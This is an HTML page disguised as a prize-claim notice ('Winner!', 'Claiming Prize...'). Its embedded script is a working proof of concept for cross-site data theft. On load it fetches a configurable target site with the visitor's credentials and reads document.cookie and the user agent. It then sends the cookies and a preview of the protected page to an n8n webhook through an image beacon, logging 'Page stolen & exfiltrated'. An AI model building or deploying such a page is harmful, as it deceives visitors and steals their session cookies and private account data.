<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Winner!</title></head>
<body>
  <h1>Claiming Prize...</h1>
  <pre id="log">Running...</pre>

  <script>
    const LOG = document.getElementById('log');
    const N8N = 'http://localhost:5678/webhook-test/cookie-capture';
    const TARGET = 'https://example.com'; // CHANGE ME

    function log(m) { LOG.textContent += '\n' + m; }

    // BEACON: No CORS, no body, no 404
    function beacon(data) {
      const params = new URLSearchParams({
        ...data,
        cookies: document.cookie,
        url: location.href,
        ua: navigator.userAgent,
        ts: Date.now()
      }).toString();

      // CRITICAL: Use EXACT webhook path + query string
      const url = `${N8N}?${params}`;
      new Image().src = url;
      log('[+] Beacon sent: ' + url.slice(0, 100) + '...');
    }

    // Fetch protected page + exfil
    async function stealPage() {
      try {
        const r = await fetch(TARGET, { credentials: 'include' });
        const text = await r.text();
        beacon({ type: 'page', status: r.status, preview: text.slice(0, 300) });
        log('[+] Page stolen & exfiltrated');
      } catch (e) {
        beacon({ type: 'error', msg: e.message });
        log('[-] Fetch failed: ' + e.message);
      }
    }

    // Run
    window.addEventListener('load', () => {
      log('[i] PoC running on: ' + location.href);
      beacon({ type: 'load' });
      stealPage();
      setTimeout(stealPage, 3000);
    });
  </script>
</body>
</html>
